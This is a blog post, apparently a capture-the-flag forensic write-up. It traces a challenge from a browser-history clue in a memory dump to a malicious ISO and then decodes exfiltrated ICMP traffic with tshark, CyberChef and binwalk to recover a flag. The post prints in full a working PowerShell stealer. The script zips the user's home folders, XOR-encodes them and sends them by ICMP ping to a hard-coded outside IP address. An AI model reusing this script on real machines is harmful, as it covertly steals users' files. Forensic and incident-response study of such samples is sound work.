---
layout: post
title: WannaGame - Thang Ban Gui 
description: Browser history forensic
tags: [WannaGame, Writeup, Powershell, Wireshark, Blue Team]
---

Link challenge: [Click here to get the link](https://drive.google.com/drive/folders/1vlr_l_4v-KXZORsj5HPfCIVGfpa_kD4x)

Hi everyone, after a long time I've not done anything in my blog, now I will share you a challenge that I think it's very interesting and very fun for anyone who want to become an incident responder or just want to learn new things. OK, so let's start!

All we have are two files: network captured file and dump file. I start with dump file, as the name of link challenge: HISTORY IN MEMORY, I've guessed that this is the key to solve this challenge. Not waiting, I've checked all files related to browser history:

And now we have a file started with "Session...", this is a file containing browser histories in Windows, and I've found a suspicious link:

![]({{ site.url }}/assets/images/thangbangui/1.png)

That link redirected me to a [minecraft website](https://hackeverythingssg.id.vn){:target="_blank"}{:rel="noopener noreferrer} which has a suspicious iso file.

I downloaded iso file and mount it, and I have a file named **AutoRun.lnk**. Read that file and I had a powershell command which redirect me to a [github link](https://gist.githubusercontent.com/hackeverythingsgg/722e57dda6c68b644e20a4ee3af4db53/raw/a9b10eafbd516d662c69126dcd8499bdf50a5803/DSKy829rioas.ps1) that containing the malicious file:

```
# Modified from https://gist.github.com/marcgeld/bfacfd8d70b34fdf1db0022508b02aca
# And https://github.com/api0cradle/Powershell-ICMP/blob/master/Powershell-ICMP-Sender.ps1

function Compress {
    [CmdletBinding()]
    Param (
	[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byte_array = $(Throw("-byteArray is required"))
    )

    [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
    $gzip_stream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzip_stream.Write($byte_array, 0, $byte_array.Length)
    $gzip_stream.Close()
    $output.Close()
    return $output.ToArray()
}

function Exfil {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byte_array = $(Throw("-byteArray is required"))
    )

    $IP = "194.233.68.172"
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $true

    [int]$buf_size = 1337 % $byte_array.Length

    for($i = 0; $i -lt $byte_array.count; $i++) {
        $byte_array[$i] = $byte_array[$i] -bxor 0xfa
    }

    $chunk_num = 1
    $total_chunks = [math]::ceiling($byte_array.Length / $buf_size)
    $data = New-Object byte[] $buf_size

    Write-Output $buf_size
    Write-Output $total_chunks

    $max_retries = 5
    $retry_count = 0

    while ($retry_count -lt $max_retries) {
        $data = $byte_array[($buf_size*($chunk_num-1))..($buf_size*$chunk_num-1)]
        $response = $ICMPClient.Send($IP, 5000, $data, $PingOptions)

        if ($response.Status -eq "TimedOut") {
            $retry_count++
        } else {
            $retry_count = 0 
            $chunk_num++
            if ($chunk_num -gt $total_chunks) { break }
        }
    }

    $data = ([text.encoding]::ASCII).GetBytes("Completed!")
    $ICMPClient.Send($IP, 10, $data, $PingOptions) | Out-Null
}

$version = $host.version.major
$current_user = $Env:UserName
$root_path = "C:\Users\" + $current_user
$zip_path = $($root_path+"\out.zip")
$list = $(Get-ChildItem -Path $root_path)

Add-Type -Assembly "System.IO.Compression.FileSystem";

foreach ($f in $list) {
    $file_path = $($root_path+'\'+$f.name)
    [System.IO.Compression.ZipFile]::CreateFromDirectory($file_path, $zip_path) 
    if ($version -eq 5){
        $byte_array = $(Get-Content $zip_path -Encoding byte)
    }
    else {
        $byte_array = $(Get-Content $zip_path -AsByteStream)
    }
    Remove-Item $zip_path
    $tmp = Compress -byte_array $byte_array
    $base64 = [System.Text.Encoding]::UTF8.GetBytes([convert]::ToBase64String($tmp))
    Exfil -byte_array $base64
}
```

Now let's analyze that file. As we can see in the source, there are 2 main functions: Compress and Exfil. 
- Compress function: it will compress all datas into gzip file 
- Exfil function: Use that IP to send ICMP packet and each byte in ICMP has been encrypted with XOR algorithm which use "0xfa" as the key to encrypt 
and in other parts, they will encode all datas in base64 format. 

Follow the workflow, it has the order: XOR - Base64 - Gzip
- First, I've extracted all ICMP data and remove all duplicated strings and all bytes which stand for "Completed!":

```
tshark -r challenge.pcapng -T fields -Y 'icmp and ip.src == 194.233.68.172' -e 'data.data' > old
sort -u old | uniq > old
```

- Use CyberChef to decrypt data and save as gzip file:

![]({{ site.url }}/assets/images/thangbangui/2.png)

- Decompress gunzip file 

```
gunzip download.gz
```

From here I've read that file and I've realised that there're some files inside this file, so I use binwalk to extract all files inside:

![]({{ site.url }}/assets/images/thangbangui/3.png)

And the file has made me question is excel file; not waiting, I've opened file in Windows and finally I've found the flag 

![]({{ site.url }}/assets/images/thangbangui/4.png)

![]({{ site.url }}/assets/images/thangbangui/5.png)
